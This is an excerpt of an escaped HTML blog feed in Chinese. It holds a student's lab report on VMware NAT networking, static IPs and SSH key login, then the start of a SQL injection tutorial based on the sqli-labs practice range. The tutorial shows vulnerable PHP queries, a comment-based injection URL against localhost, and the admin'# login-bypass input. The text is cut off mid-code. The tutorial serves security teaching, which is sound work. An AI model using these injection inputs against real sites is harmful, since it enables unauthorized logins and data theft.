&lt;h4 id=&#34;22-配置网络为nat模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-配置网络为nat模式&#34;&gt;#&lt;/a&gt; 2.2 配置网络为 NAT 模式&lt;/h4&gt;
&lt;h5 id=&#34;1虚拟机配置为动态ip地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1虚拟机配置为动态ip地址&#34;&gt;#&lt;/a&gt; （1）虚拟机配置为动态 IP 地址&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;点击 vm 编辑，点击虚拟网络编辑器&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzI3MTkzNDAucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232719340.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914232719340&amp;quot; style=&amp;quot;zoom:80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发现需要管理员特权才能更改，点击更改设置&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzI4NDgxODcucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232848187.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914232848187&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;进入后，选择 VMnet8，选择 NAT 模式，开启 DHCP，将子网 ip 网段改成我的学号后两位 09，最后点击确定&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzM0MDk1NTEucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233409551.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914233409551&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;等待加载完成后，查看虚拟网卡的 IP&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzM5MjA5MjUucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233920925.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914233920925&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看虚拟机 ip，这里发现 ip 地址的网段没有更改，重启后也没有改变&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQwMTgxMzAucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234018130.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914234018130&amp;quot; style=&amp;quot;zoom:80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这里发现物理主机的网段也是 0，判断应该是这台 Linux 虚拟机的网络链接模式还是桥接没有改成 NAT&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQxNTUwMjQucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234155024.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914234155024&amp;quot; style=&amp;quot;zoom:80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看本 Linux 设置中的网络适配器，发现是桥接模式，这里更改为 NAT&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQ0MjM3NTcucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234423757.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914234423757&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;更改完成重新启动虚拟机，查看 ip 地址，网段变更一致&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzQ1MjUxMTIucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234525112.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914234525112&amp;quot; style=&amp;quot;zoom: 80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;测试 Linux 和主机的连通性&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234633267.png&#34; alt=&#34;image-20220914234633267&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;2虚拟机配置为静态ip地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2虚拟机配置为静态ip地址&#34;&gt;#&lt;/a&gt; （2）虚拟机配置为静态 IP 地址&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;进入 /etc/sysconfig/network-scripts/ 目录打开网卡配置文件 ifcfg-ens33&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzU1MDI0MDcucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914235502407.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914235502407&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打开后输入 i 进入插入模式，更改网卡配置文件&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDAzMTI3NTgucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000312758.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915000312758&amp;quot; style=&amp;quot;zoom:80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;BOOTPROTO&amp;#x3D;&amp;quot;static&amp;quot;       &amp;#x2F;&amp;#x2F;修改：将dhcp修改为static，修改后为BOOTPROTO&amp;#x3D;static
ONBOOT&amp;#x3D;yes               &amp;#x2F;&amp;#x2F;修改为yes, 网卡开机自启动

IPADDR&amp;#x3D;&amp;quot;xxx.xxx.xxx.xxx&amp;quot;    &amp;#x2F;&amp;#x2F;新增：配置静态IP地址，按需配置
NETMASK&amp;#x3D;&amp;quot;255.xxx.xxx.xxx&amp;quot;   &amp;#x2F;&amp;#x2F;新增：配置子网掩码
GATEWAY&amp;#x3D;&amp;quot;xxx.xxx.xxx.xxx&amp;quot;   &amp;#x2F;&amp;#x2F;新增：配置网关
DNS1&amp;#x3D;&amp;quot;xxx.xxx.xxx.xxx&amp;quot;        &amp;#x2F;&amp;#x2F;新增：配置DNS&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点击 Esc，键入:wq 保存并退出，重启网卡&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000632584.png&#34; alt=&#34;image-20220915000632584&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;再次查看虚拟机的 IP 地址，发现更改成功&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDA3MDk1NzYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000709576.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915000709576&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;测试 Linux 和主机的连通性&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000755532.png&#34; alt=&#34;image-20220915000755532&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;23-远程访问centos-7系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23-远程访问centos-7系统&#34;&gt;#&lt;/a&gt; 2.3 远程访问 CentOS 7 系统&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;点击 session&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDExMDQ3NzgucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001104778.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915001104778&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;选择 ssh，输入 IP 地址，主机名&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDExNTMzOTUucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001153395.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915001153395&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点击 ok 后，键入密码&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDEzMzQ3MjUucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001334725.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915001334725&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;24-两台linux密钥登陆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24-两台linux密钥登陆&#34;&gt;#&lt;/a&gt; 2.4 两台 Linux 密钥登陆&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;关闭虚拟机，创建一个克隆&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDIwMTE4OTcucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002011897.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915002011897&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打开两台虚拟机，查看克隆机的 ip 地址&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDIxMjg0ODUucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002128485.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915002128485&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这里更改网卡配置，使得两个虚拟机的 IP 地址不同&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDI1NTQyMDAucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002554200.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915002554200&amp;quot; style=&amp;quot;zoom:80%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;同样使用 MobaXterm 连接&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMDI4NDgwOTQucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002848094.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915002848094&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 ssh-keygen 命令生成密钥对儿&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMTM4MTY2MDIucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915013816602.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915013816602&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将公钥 /root/.ssh/id_rsa.pub 的内容存入另一台虚拟机的 /root/.ssh/authorized_keys&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTUwMTQxMTg0ODEucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915014118481.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220915014118481&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;便可以直接登录，相互登录实现&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915015619902.png&#34; alt=&#34;image-20220915015619902&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;25-使用快照保存当前状态&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#25-使用快照保存当前状态&#34;&gt;#&lt;/a&gt; 2.5 使用快照保存当前状态&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001507112.png&#34; alt=&#34;image-20220915001507112&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;3实验小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3实验小结&#34;&gt;#&lt;/a&gt; 3. 实验小结&lt;/h3&gt;
&lt;p&gt;经过本次实验，学会了 nat 模式下的动态 ip 和静态 ip 地址的配置，加深了我对桥接和 nat 两种模式的理解，区分了虚拟网卡和物理网卡的联系和区别，学到了两台 Linux 主机的免密登录方式&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/</id>
        <title>SQL注入</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;h2 id=&#34;什么是sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是sql注入&#34;&gt;#&lt;/a&gt; 什么是 sql 注入&lt;/h2&gt;
&lt;p&gt;学一个漏洞我们应该知道，漏洞的危害，成因、原理、攻击方式，以及防御方式。所以这里首先聊一聊什么是 sql 注入，SQL 注入分类于 web 安全漏洞，通过 sql 注入攻击者可以干扰应用程序对其数据库进行查询。它通常允许攻击者查看他们正常无法检索到的数据。许多情况下攻击者可以对数据库进行增删改查的操作&lt;/p&gt;
&lt;h2 id=&#34;sql注入的危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入的危害&#34;&gt;#&lt;/a&gt; sql 注入的危害&lt;/h2&gt;
&lt;p&gt;前面说完了什么是 sql 注入，接下来我们聊一聊 sql 注入漏洞造成的危害，sql 注入成功后我们不仅可以像上面提到是那样对各种数据进行增删改查，如果网站目录存在写入权限我们可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等，甚至可以通过提权等操作获取服务器最高权限来远程控制服务器，安装后门，修改或者控制操作系统&lt;/p&gt;
&lt;h2 id=&#34;sql注入的成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入的成因&#34;&gt;#&lt;/a&gt; sql 注入的成因&lt;/h2&gt;
&lt;p&gt;sql 漏洞的成因很简单，就是开发过程没有对用户的输入进行严格的过滤，开发人员违背了 “代码与数据分离” 原则。一方面，攻击者可以任意更改输入数据；另一方面，攻击者可以在数据里构造代码，让服务器端把数据解析成代码执行。攻击者通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。&lt;/p&gt;
&lt;h2 id=&#34;sql注入的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入的分类&#34;&gt;#&lt;/a&gt; SQL 注入的分类&lt;/h2&gt;
&lt;h3 id=&#34;有回显的注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有回显的注入&#34;&gt;#&lt;/a&gt; 有回显的注入&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;联合查询&lt;/li&gt;
&lt;li&gt;报错注入&lt;/li&gt;
&lt;li&gt;通过注入进行 DNS 请求，达到回显的目的&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;无回显的注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无回显的注入&#34;&gt;#&lt;/a&gt; 无回显的注入&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Bool 盲注&lt;/li&gt;
&lt;li&gt;时间盲注&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;二次注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二次注入&#34;&gt;#&lt;/a&gt; 二次注入&lt;/h3&gt;
&lt;p&gt;一种业务逻辑复杂的题目，一般需要自己编写脚本来实现自动化注入&lt;/p&gt;
&lt;h2 id=&#34;where子句的sql注入漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#where子句的sql注入漏洞&#34;&gt;#&lt;/a&gt; where 子句的 sql 注入漏洞&lt;/h2&gt;
&lt;p&gt;本笔记基于 sql-labs 靶场记录&lt;/p&gt;
&lt;p&gt;sql-labs 第一关&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM users WHERE id=&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$id&lt;/span&gt;&lt;/span&gt;&#39; LIMIT 0,1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有详细信息（*）&lt;/li&gt;
&lt;li&gt;从 users 表中&lt;/li&gt;
&lt;li&gt;其中类别是 id&lt;/li&gt;
&lt;li&gt;limit 0,1 表示的是从第一条记录开始，只取一条&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_fetch_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;这里会将 sql 查询的结果返回，这一关并没有进行任何的过滤，所以攻击者可以构建&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-payload&#34; data-language=&#34;payload&#34;&gt;&lt;code class=&#34;language-payload&#34;&gt;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;sqli-labs-master&amp;#x2F;Less-1&amp;#x2F;?id&amp;#x3D;1&amp;#39;--&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925110237019.png&#34; alt=&#34;image-20220925110237019&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里的关键是两个减号在 SQL 中是注释指示符，意味着查询的其余部分被解释为注释。这将使得原有的语句后部分无法被包含，也就可以突破 limit 0,1 的限制查询到所有的数据&lt;/p&gt;
&lt;h3 id=&#34;颠覆应用逻辑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#颠覆应用逻辑&#34;&gt;#&lt;/a&gt; 颠覆应用逻辑&lt;/h3&gt;
&lt;p&gt;sql-labs 第 11 关&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM users WHERE username=&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$uname&lt;/span&gt;&lt;/span&gt;&#39; and password=&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$passwd&lt;/span&gt;&lt;/span&gt;&#39; LIMIT 0,1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;一个登录页面，判断用户输入在数据库中能不能查询到，如果查询到则登录，查询不到这则拒绝，这里攻击者只需要使用 SQL 注释将密码的判断注释掉这可以直接用用户名登录&lt;br /&gt;
如这里有一个 admin 用户只需要在用户名处输入 admin&#39;# 即可登录&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&#39; and password=&#39;&#39; LIMIT 0,1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; 